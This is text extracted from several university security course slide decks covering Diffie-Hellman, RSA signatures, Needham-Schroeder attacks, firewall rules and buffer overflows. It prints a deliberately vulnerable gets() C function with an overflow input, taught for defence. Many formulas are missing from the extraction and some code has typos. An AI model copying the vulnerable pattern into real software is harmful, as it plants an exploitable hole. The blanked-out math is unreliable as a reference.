The communication are encrypted using symmetric algorithm such as AES or DES

Question: 
Alice wants to send a message to Bob. However, Bob does not own a public key.

What can they do if Alice owns a key?
What can they do if none of them owns a key?
Hybrid Protocol
Question: 
Alice wants to send a message to Bob. However, Bob does not own a public key.

What can they do if Alice owns a key?
What can they do if none of them owns a key?

Conclusion: 
At least one of the parties should maintain a public key.
Cryptography 
Diffie – Hellman Protocol (Key Exchange)
Public Key Cryptography
Diffie-Hellman Protocol

 The first algorithm that was developed in order to enable two parties to agree about a key
 The messages exchanged between two parties sent over public channel that can be eavesdropped by an attacker
 Based on public key cryptography

Primitive root modulo prime
 In modular arithmetic, a number  is a primitive root modulo  if every number  is a power of  modulo n. 
Reminder 
 That is, for every integer  coprime to n, there is an integer  such that .
 Such  is called the discrete logarithm of  to the base  modulo 
 For example, The number 3 is a primitive root modulo 7







Primitive root modulo prime - Algorithm
Algorithm for calculating the prime root of 
Calculate 
Determine all the prime factors  of 
For every   
Count = 0
For every  If () than count = count + 1
If(count == i) return x

Primitive root modulo prime - example
16

 Assume we want to calculate the prime root  of 
 Calculate 
 Determine all the prime factors  of 
 

 






16
Diffie-Hellman Example

Alice choose 
Bob Choose 
Alice sends to Bob 
Bob sends to Alice 

Eve can see 27 and 10 but it hard to calculate 19 from it (e.q to discrete logarithm)


Visible to the attacker
Cryptography 
Man In The Middle (MiM) Attack
Public Key Cryptography
Man In the Middle 
 Two people can decide about public keys (like in Diffie Hellman protocol) 
 However, an attacker can intermediate during the key exchange and cause both sides to believe he is the other side
Man In the Middle


3. 

Man In the Middle


In the end of the attack, the attacker holds two symmetric keys (one with each party) 
Problem: We don’t bind a key to its owner (identity)
Cryptography 
Digital Signatures
Public Key Cryptography
Digital signatures 
Goals:
 Authentication -the source of the message (who is the sender)
 Integrity –Nobody changed the content of the message 
 Non-repudiation of origin– The sender is the only one who can sign the message, the sender cannot deny signing the message
 Asymmetric key cryptography uses:
Private key- the sender signs on the message
Public key- authentication of the signature

Digital signatures 

Digital 
Signature 
Kprivate
Message



Transmit
Calc msg hash





Digital 
Signature 
Kpublic
msg. hash
decrypt signature
Compare


24
Digital signatures - Algorithm
The algorithm consists of two functions:
The signature function
  
The verification function



פונקציה חתימה Sig הצפנה של הודעה M על ידי המפתח הפרטי של המשתמש u.
פונקצית V פענוח ההודעה בעזרת המפתח הפומבי של u.


25
RSA Digital Signature 
 The sender chooses:
Public-key  and Private-key  
everybody can verify the signature
only the sender can sign the message
The sender signs the message M using the private key:
 
 The receiver verifies the signature using the public key
 = 

RSA Digital Signature - Attacks 
Similar to the RSA attack If the attacker saw two signed messages:


He can generate the signature of 
= *  

Digital Signature – More Problems
When we use digital signature we enlarge the amount of data we need to transfer
Computation time of the digital signature is very long and depends on the size of the message
The verification time is long too, and also depends on the size of the message


מגדילה את התעבורה ברשת


28
Public-Key vs Symmetric-Key Cryptography
Public-Key	Symmetric-Key
Each user has a pair of cryptographic keys. A public encryption key, and a private decryption key	The encryption and decryption keys are trivially related
The publicly available encrypting key is widely distributed and the private decrypting key is known only to the recipient (The private key cannot feasibly be derived from the public key)	The key is a secret
Very slow	Very fast
Rely on complexity of mathematic problems (for example, integer factorization, discrete log)	Do not relay on complexity of mathematic problems
Related algorithms: RSA, Elgamal, Diffie-Helman	Related algorithms: AES, DES
Uses for authentication, key agreement and integrity (digital signature)	Uses for confidentiality (encryption) and integrity (MAC)
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-5---פרוטוקולי-אימות\PS-4.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
PRACTICAL SESSION NO. 4
AUTHENTICATION PROTOCOLS

Computer & Information Security
Authentication Protocol – what is it?
 A communications protocol, which specifically designed to transfer authentication data between two entities. 
 It allows to authenticate two entities
One way authentication
Two way authentication
 Most important layer of protection needed for secure communication within computer networks
Needham – Schroder protocol
 A key transport protocols intended for use over an insecure network
Developed by Roger Needham and Michael Schroeder
A successful execution of the protocol aims to provide
 Authentication: two way authentication
 Confidentiality: a secret (symmetric) session-key between the two entities
Two architectures: 
 Symmetric Key Protocol 
Public Key Protocol
The Actors
Alice
Bob
Trusted Server
Alice wish to initiate a secure and authenticate communication with Bob
To do so, Alice use a server trusted by both Alice and Bob
Alice, Bob, and the trusted server can all communicate with each other.
The Actors
Alice
Bob
Trusted Server
Eve represents a malicious actor
Eve can intercept (stop/modify) all system communication
Alice – Server
Alice – Bob
Bob – Server
Eve cannot read encrypted data; break symmetric or asymmetric encryptions/signatures; and predict large random numbers.
Eve
Eve
Eve
The Actors
Alice
Bob
Trusted Server
The main objectives of Eve are either:
Read the encrypted communication between Alice and Bob
Authenticate as Alice/Bob  
Eve
Eve
Eve
Authentication Protocols
Needham – Schroder Protocol 

Public-Key protocol
Symmetric protocol
NS Public-Key protocol
Nonce: arbitrary number that may be used once. Often used as pseudo-random number issued in an authentication protocol to ensure that old communication cannot be reused.
 S is a server trusted by both party – A.K.A Key Distribution Center (KDC)
Alice and Bob uses the trusted server to distribute public keys on request.
Both Alice and Bob are familiar with the public key of the trusted server


NS Public-Key protocol- example
Explanation:
1. A requests B's public keys from S

NS Public-Key protocol- example
Explanation:
2. S responds with public key alongside B's identity, signed by the server for authentication purposes





להסביר על העובדה שהשרת חותם באמצעות הפרטי, והפתיחה באמצעות הציבורי-מוודאים כך שאכן אנחנו מדברים עם השרת ולא עם מתחזה כי רק הוא מחזיק במפתח הפרטי
10
NS Public-Key protocol- example
Explanation:
3. A chooses a random nonce () and sends it to B, encrypted by Bob’s public key





NS Public-Key protocol- example
Explanation:
4. B now knows A wants to communicate, so B requests A's public keys






NS Public-Key protocol- example
Explanation:
5. Server responds with Alice public key, signed with his own private key







NS Public-Key protocol- example
Explanation:
6. B chooses a random nonce , and sends it to A along with to prove ability to decrypt with 








NS Public-Key protocol- example
Explanation:
7. A confirms to B, to prove ability to decrypt with 









At the end…
At the end of the protocol, A and B know each other's identities, shared a session key

Does this protocol vulnerable?
Attack on the protocol
 The protocol is vulnerable to a Man in the Middle attack
 If Eve can persuade Alice to initiate a session with her, he can relay the messages to B and convince B that he is communicate with A

NS Public-Key protocol- MiM Attack












At the end of the attack, Bob falsely believes that Alice is communicating with him, and that are known only to A and B
Fixing required…
 Inclusion of the responder’s identity at step 6







Authentication Protocols
Needham – Schroder Protocol 
(Roger Needham, Michael Schroeder)
Public-Key protocol
Symmetric protocol
NS Symmetric Key protocol - Annotations
Nonce: an arbitrary number that may be used once. Often used as pseudo-random number issued in an authentication protocol to ensure that old communication cannot be reused
 Alice initiates the communication to Bob
 S is a server trusted by both party – A.K.A Key Distribution Center (KDC)
We assume that the server  S have a symmetric key with all the entities in the system
NS Symmetric key - example
Explanation:
1. Alice sends a message to the server identifying herself and Bob, telling the server she wants to communicate with Bob.

NS Symmetric key - example
Explanation:
2. The server generates  and sends back to Alice a copy encrypted under  for Alice to forward to Bob and also a copy for Alice. Since Alice may be requesting keys for several different people, the nonce assures Alice that the message is fresh and that the server is replying to that particular message and the inclusion of Bob's name tells Alice who she is to share this key with. 





NS Symmetric key - example
Explanation:
3. Alice forwards the key to Bob who can decrypt it with the key he shares with the server, thus authenticating the data.





NS Symmetric key - example
Explanation:
4. Bob sends Alice a nonce encrypted under  to show that he has the key






NS Symmetric key - example
Explanation:
5. Alice performs a simple operation on the nonce, re-encrypt it and sends it back verifying that she is still alive and that she holds the key







Does this protocol vulnerable?
Attack on the protocol
 The protocol is vulnerable to a replay attack
 If an attacker uses an older, compromised value for he can replay the message at step 3 towards Bob
 When Bob will receive the message he will accept it, being unable to tell that the key is not fresh
 Attack should be able to intercept handshake at step 4, than can impersonate Alice’s response


Fixing required…
 Inclusion of a timestamp (TS)





Explanation:
TS is a timestamp that assures Alice and Bob that the session key has only just been generated. Thus, both Alice and Bob knows that the Server created a freshly session key.
Replay attack will be failed at step 3 due to Bob checking for untimely session key
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-6---חומת-אש\PS-5.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
PRACTICAL SESSION NO. 6
FIREWALLS

Computer & Information Security
General Information
 Teaching Assistant
Aviad Elyashar
 Email:
 aviade@post.bgu.ac.il
 Office Hours:
 Monday 13:00 at Building 96 room 101 (1st floor)



Firewalls
 Effective mean of protection a local system or network of systems from incoming and outgoing security threats 
 Aims:
 Establish a controlled link
 Protect the premises network from Internet based attacks 
 Provide a single choke point
 Design goals:
 All traffic between protected entities must pass through the firewall 
 Only authorized (by Organization security policy) traffic will be allowed to pass
 The firewall itself is immune to penetration 

Firewalls
State Less
State-less Packet Filter
State-full packet Filter
Proxy Server
Iptables
Firewalls
Packet Filter Firewall
 Each packet is passed through the firewall (in/out)
 For each packet the firewall makes a decision regarding the packet
 The decision is based on the rules tables
 Advantages:
 Simplicity
 Transparency to users
 High Speed
 Disadvantages:
 Difficulty of setting rules
 Lack of authentication

Packet Filter Firewall – Rules table
 Packets pass through the rules table until a rule is met
 The order of the rules matters!
Simple rules should come first
Edge case and “heavy” rules should come last

 “Default Deny/Allow” – If no rule is met the decision will be based in the firewall policy (Allow/Deny/Drop)
The difference between ‘Drop’ and Deny’ is that Drop won’t send a response and the Deny will send a refuse response

 Rule table Example:


Action	Ack	Dst. port	Src.port	Protocol	Dst.Addr.	Src. Addr.	In/Out	Rule
Drop	*	80	*	TCP	*	10.0.0.5	in	1
Allow	*	*	*	*	*	*	*	2
‘*’ Sign mean wildcard for ‘any’

SYN -> SYN ACK ->ACK
להסביר על הטבלה
Ack - האם ה- bit של ה-Ack דלוק בפקטת tcp 

6
Firewalls  -Stateless packet filter
Each packet considered as a single unit with no relation to other packets
Each packet will go through the rules table
The decision about the packet is based on the rules and the default policy

Possible attacks:
IP address spoofing
Tiny fragments attacks

IP address spoofing  - זיוף של כתובת הIP גורר מניפולציה על טבלת החוקים 
Tiny fragments attacks – חלוקה של הפאקטה לחתיכות קטנות שלא ניתנות להרכבה בצורה טובה לאחר מכן כתוצאה מחוסר במידע. הדבר יכול לגרום לDOS או ניסיון להכניע את מנגנון הpacket filter
7
Firewalls
Firewalls
State Full
State-less Packet Filter
State-full packet Filter
Proxy Server
Iptables
Firewalls – State-full packet filter
 Concept:
Define the allowed and forbidden connections
Only a packet that opens a connection is checked by the rules table
Retaining packets until enough information is available to make a judgement about its state
 If the packet is allowed, information about the session is saved:
 Source address + port
 Destination address + port
 Protocol
 Static rules still used (as state-less), but can now contain connection state as one of their test criteria
 A packet that doesn’t open a session or doesn’t belong to a session is dropped

The session’s protocol is TCP or UDP

9
State-full packet filter - example
Client sent a packet to the Server
The Firewall intercept the packet
Check IP header against rules table
Check TCP header against rules table
Make decision according rules

 Noticed the State and Second Until expires columns



10
 Firewalls
Proxy
State-less Packet Filter
State-full packet Filter
Proxy Server
Iptables
Firewalls
Firewalls - Proxy Server
 Legal Man In the Middle – each request to the internet maintained by the proxy 
Saved a cache of common request and check freshness by requests
 The client communicates the proxy, and the proxy communicates with the server
 Usually works on the application (TELNET/FTP/SMTP/HTTP etc.) level
  Also K.A ‘Application-level Gateway’


Proxy Sever – Pros Vs. Cons
ADVANTAGES
 Higher security than packet filters
 Apply access control without changing the application
 No direct connection ‘outside’ world
 Easy to log and audit all incoming traffic
DISADVANTAGES
 Every application requires writing a new proxy
 The server does not “see” the client
 Can reduce performance (additional overhead on each connection)

עבור כל אפליקציה יש צורך לכתוב שרת פרוקסי מתאים ז"א צריך מודול שיממש את הפרוקסי עבור כל אפליקציה ספציפית.
בדר"כ בapplication level proxy זה בעצם שהפרוקסי מתפקד כשרת אל מול הקליינט וכקליינט אל מול השרת. 
וכדי לבצע את MiTM הוא צריך לממש גם קליינט וגם שרת של אותו פרוטוקול אפליקציה ולכן זה משהו שהוא ייעודי פר פרוטוקול אפליקציה.
13
Firewalls
Iptables
State-less Packet Filter
State-full packet Filter
Proxy Server
Iptable
Firewalls
Iptables
 A user space program that allows to configure the Linux Kernel Firewall
 Allows to chain firewall rules
 Could define a state-full firewalls rules (based on state{ESTABLISHED/RELATED})
 Other functionalities
 Port Forwarding
 IP Forwarding
 Logging



Port Fowarding
הדבר מאפשר למחשבים מרוחקים, אשר מחוברים לרשת האינטרנט, למשל, להתחבר למכונה מסוימת המחוברת לרשת פרטית, שאינה נגישה בדרכים רגילות.
השיטה נפוצה גם כאשר יש צורך בגישה למחשב אשר מחובר רק לרשת פנימית. אז משתמשים במחשב מתווך, המחובר גם לרשת הפנימית וגם לזו לחיצונית, אשר מעביר את התקשורת בין הצדדים. בדרך כלל התקשורת הזו מתבצעת בפרוטוקול המוצפן SSH.

IP forwarding also known as IP routing or Internet routing is a process used to determine which path a packet or datagram can be sent.The process uses routing information to make decisions and is designed to send a packet over multiple networks
Logging is the act of keeping a log. In the simplest case, messages are written to a single log file.
15
 The IP Tables firewall consist of 3 default chains:
Input - for incoming traffic
Output – for outgoing traffic
Forward – for traffic that is forwarded
 It is possible to define new chains to add depth to the rules tables
 Each chain has a default policy (Allow/Drop/..)



Iptables - Chains

Input Chain
Rule 1

Rule 2
Custom Chain
Rule 1

Rule 2

Rule 3



Traffic that is port forwarded to the same device will still pass through the forward chain rules

16
Iptables - Rules
 Structure – a Criteria and a Target
 Criteria – the things we want to make sure the packet contains (port, protocol, IP add., etc..)
 Target – the action to be performed, Can either be an immediate action (Drop/Reject/Accept) or a call the another chain
 We add a rule to a chain be defining the rule, its parameters and the chain
 Order of the rules does matter
 Example : iptables –A INPUT –p TCP --dport 80 –j ACCEPT



-A = mean to append rule to the INPUT/OUTPUT/FORWARD chain
-j = target of the rule
-p = Port of the rule

17
Q1
We have an internal web server, used only for testing purposes, at IP address 5.6.7.8 on our internal corporate network. A packet filter firewall is situated at a single endpoint between our internal network and the rest of the Internet.

5.6.7.8
Q1
Q: Can a stateless firewall block all attempts by outside hosts to initiate a direct TCP connection to this internal web server?
If yes, show a packet filtering rules set that provides this functionality; if no, explain why.


Action	Ack.	Dest, port	Source port	Protocol	Dest. Addr.	Source Addr.	Direction	Rule
drop
	*	*	*	TCP	5.6.7.8	*	in	No_TCP
5.6.7.8
Q2
Q: Can a stateless packet filter block all incoming email containing the phrase “Make money fast”? 
If yes, show a packet filtering rules set that provides this functionality; 
if no, explain why.



A: The sentence can be sent over few packets. Stateless firewall doesn’t remember the previous state and therefore, can’t  block such e-mail. 

5.6.7.8
Q3



Suggested Solution


2. מלאו את טבלת החוקים עבור Firewall שמגן על רשת מחלקת הכספים (FN)

Action	Ack	Dest. Port	Src. Port	Protocol	Dest. Add	Src. Add	In/Out	Rule Name
Drop	*	*	*	TCP	FN_FTP	*	IN	FN_FTP_Drop
Allow	*	80	*	TCP	HBS_WEB	FN	OUT	Http_General
Allow	*	*	80	TCP	FN	HBS_WEB	IN	Http_General__IN
Allow	*	80	*	TCP	MN_WEB	FN	OUT	MN_WEB_OUT
Allow	*	*	80	TCP	FN	MN_WEB	IN	MN_WEB_IN
Allow	*	*	25	TCP	FN	HBS_SMTP	IN	SMTP_Mail_IN_PUBLIC
Allow	*	25	*	TCP	HBS_SMTP	FN	OUT	SMTP_Mail_OUT_PUBLIC
Allow	*	587	*	TCP	HBS_SMTP	FN	OUT	SMTP_Mail_OUT_ENCRYPT
Allow	*	*	587	TCP	FN	HBS_SMTP	IN	SMTP_Mail_IN_ENCRYPT
Drop	*	*	*	*	*	*	*	Default
הנחות: 
נאפשר התקשרות מאובטחת ולא מאובטחת לשרת המייל מתוך רשת הכספים


24
Action	Ack	Dest. Port	Src. Port	Protocol	Dest. Add	Src. Add	In/Out	Rule Name
Allow	*	80	*	TCP	HBS_WEB	*	IN	Http_General
Allow	*	*	80	TCP	*	HBS_WEB	OUT	Http_General_OUT
Allow	*	80	*	TCP	MN_WEB	*	IN	Http_MN
Allow	*	*	80	TCP	*	MN_WEB	OUT	Http_MN_OUT
Allow	*	587	*	TCP	HBS_SMPT	*	IN	SMPT_Mail_IN
Allow	*	*	587	TCP	*	HBS_SMPT	OUT	SMPT_Mail_OUT
Drop	*	*	*	*	*	*	*	Default
 	 	 	 	 	 	 	 	 
2. מלאו את טבלת החוקים עבור Firewall המתווך בין רשת 'הפועל באר שבע' לרשת האינטרנט הציבורית
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-7---BOF\PS-8---Buffer-Overflow.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 8
BUFFER OVERFLOW ATTACKS (BOF)


2
Agenda
Process Memory Recap
Buffer Overflow Attack
Prevention
Input Checking
Stack Canary
DEP
Return Oriented Programming (ROP)

2

3
Process Memory Recap

3

4
Process Memory

4


5
Process Memory (x86)
5

0x0
0xFFFFFFFF
= 4GB

6
Process Memory (x86)
6

0x0
0xFFFFFFFF
Kernel Space
User Space
0xC0000000

7


6
Process Memory (x86)
7

0x0
Text Segment
0x08048000
End of Text Segment
0xFFFFFFFF
Kernel Space
0xC0000000

8


7
Process Memory (x86)
8

0x0
Text Segment
Data Segment
Start of Data Segment
End of Data Segment
0xFFFFFFFF
Kernel Space
0xC0000000

9
Process Memory (x86)
9

0x0
Text Segment
Data Segment
Start of BSS Segment
End of BSS Segment
BSS Segment
0xFFFFFFFF
Kernel Space
0xC0000000

10
Process Memory (x86)
10

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000

11
Process Memory (x86)
11

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region

12
Process Memory (x86)
12

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack


13

Memory Mapping region – apps can ask for mapping via nmap() system call, used for loading dynamic libs.
Heap – runtime memory allocation, C is malloc() , C# is new().
BSS and Data store contents for static/global vars in C. BSS for uninitialized , Data for initialized.

12
Process Memory (x86)
13

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack

Three Important Registers:
EBP – Base Pointer
ESP – Stack Pointer
EIP – Instruction Pointer

14
Process Memory (x86)
14

0x0
0xFFFFFFFF
High Address
Stack

Low Address

15
The Stack
15
High Address
Stack

Low Address

16
The Stack
16
High Address
Stack

Low Address

17
The Stack – Calling a function
17
High Address

Low Address
…
EBP
ESP
Call func1
Push Return Address
Jmp func1
Push IP+1
Jmp func1
=
=

18
The Stack – Calling a function with parameters
18
High Address

Low Address
…
EBP
ESP
Push Param2
Push Param1
Push Return Address
Jmp func1

19
The Stack – Calling a function
with parameters
19
High Address

Low Address
…
EBP
ESP
Param2
Push Param2
Push Param1
Push Return Address
Jmp func1

20
The Stack – Calling a function
with parameters
20
High Address

Low Address
…
EBP
ESP
Param2
Param1
Push Param2
Push Param1
Push Return Address
Jmp func1

21
The Stack – Calling a function
with parameters
21
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
Push Param2
Push Param1
Push Return Address
Jmp func1

22
The Stack – Calling a function
with parameters
22
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
Push Param2
Push Param1
Push Return Address
Jmp func1

23
The Stack – Inside a function
23
High Address

Low Address
…
EBP
ESP
Push EBP
Move EBP ESP
Param2
Param1
Return Address

24
The Stack – Inside a function
24
High Address

Low Address
…
EBP
ESP
Push EBP
Move EBP ESP
Param2
Param1
Return Address
Old EBP

25
The Stack – Inside a function
25
High Address

Low Address
…
EBP
ESP
Push EBP
Move EBP ESP
Param2
Param1
Return Address
Old EBP

26
The Stack – Inside a function
26
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
Old EBP
Local Variable 1
Local Variable 2
Local Variable 3

27
The Stack – Before returning from a function
27
High Address

Low Address
…
EBP
ESP
Pop EBP
Param2
Param1
Return Address
Old EBP

28
The Stack – Before returning from a function
28
High Address

Low Address
…
EBP
ESP
Pop EBP
Param2
Param1
Return Address

29
The Stack – Returning from a function
29
High Address

Low Address
…
EBP
ESP
Ret
Param2
Param1
Return Address

Pop ECX
Jmp ECX

30
The Stack – Returning from a function
30
High Address

Low Address
…
EBP
ESP
Ret
Param2
Param1
=
Pop ECX
Jmp ECX
ECX = Return Address

31
Buffer Overflow Attack
HOW DOES IT HAPPEN
31

32
Types
 Stack Overflow
  Heap Overflow
  Integer Overflow
32

33
Buffer Overflow
Look at the following c code:




- What is the purpose of this function?
Receive a log message from user and write it to the log.
- What is the problem with this function?
No length check on b after returning from gets.
33
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}

34
Buffer Overflow
34
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}

35
Buffer Overflow
35
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address

36
Buffer Overflow
36
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address
Old EBP

37
Buffer Overflow
37
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address
Old EBP
b[64]

38
Buffer Overflow
38
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address
Old EBP
b[64]

39
Buffer Overflow
39
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Return Address
Old EBP
b[64] = [‘L’, ‘e’, ‘s’, ‘s’, ‘ ‘, ‘t’, ‘h’, ‘a’, ‘n’, ‘ ‘, ‘6’, ‘4’, 0, …………] 
User input size  64
For example: “Less than 64”

40
Buffer Overflow
40
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Return Address
Old EBP
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]
User input size  64
For example: “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA” (“A” x 80)

41
Buffer Overflow
41
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Return Address
Old EBP
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]

42
Buffer Overflow
42
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP
ESP
Return Address
Old EBP
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]


43
Buffer Overflow
43
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
EBP = ?
ESP
Return Address
Old EBP
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]


44
Buffer Overflow
44
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
High Address

Low Address
ESP
Return Address
Old EBP
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]

What Happened when we perform RET?
Where will the program jump to?

45
Prevention
HOW DO WE PREVENT OR BLOCK BOF ATTACKS
45

46
Input Checking
46
Void func1() {
      char[] b[64];
      printf(“Type a Log Message”);
      gets(b);
      writeLogMessage(b);
}
How can we fix this?
Check buffer boundaries
Use of safe functions (fgets)
Use memory-safe languages (Java, C#)

47
Stack Canary
Solution in the compiler level:
47
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
Push EBP
Move EBP ESP
Old EBP

48
Stack Canary
Solution in the compiler level:
48
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
CANARY
Push EBP
Push CANARY
Move EBP ESP
Old EBP

49
Stack Canary
The canary is a sequence of randomly chosen bytes (At compilation time).
Upon returning from a function the canary is checked to see if it was changed:
No change: no BOF
Change detected: BOF performed, exit program.
49

50
Stack Canary
When a BOF is performed, canary is overwritten.
50
High Address

Low Address
…
EBP
Param2
Param1
Return Address
CANARY
Old EBP
